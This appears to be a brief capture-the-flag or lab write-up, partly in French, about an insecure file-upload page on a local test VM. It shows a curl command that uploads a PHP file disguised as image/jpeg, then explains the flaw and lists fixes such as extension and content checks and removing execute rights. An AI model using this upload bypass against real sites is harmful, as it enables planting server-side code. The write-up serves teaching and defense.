# situation

## http://192.168.56.101/index.php?page=upload#

on se doute qu ils y a une faille par la donc on upload via curl

curl  'http://192.168.56.101/?page=upload' -F 'uploaded=@exploit.php;type=image/jpeg' -F 'Upload=Upload'


# problem
You can upload anything as long as it have the right property type.
You should never be able to load a php file where an image is expected.

# fix
Do not rely on the type indicated. At list check for the image extension first and then check the image content.
It shoukd be qn image not a script...
And never execute it; drop the permissions.
- You can also remove php the ability to run anything in the upload file
- you can also invalidate the script inside for example by converting jpg to png
- You can check metadata but its not that relyable as it can be forged